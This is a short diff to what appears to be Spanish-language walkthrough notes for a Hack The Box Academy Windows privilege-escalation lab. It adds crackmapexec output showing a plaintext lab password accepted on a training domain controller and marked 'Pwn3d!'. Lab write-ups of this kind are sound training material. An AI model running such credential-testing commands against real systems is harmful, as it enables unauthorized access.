@@ -248,6 +248,9 @@ server_adm
 
 ```
 crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+
+SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
 ```
 
 **Explicación**:
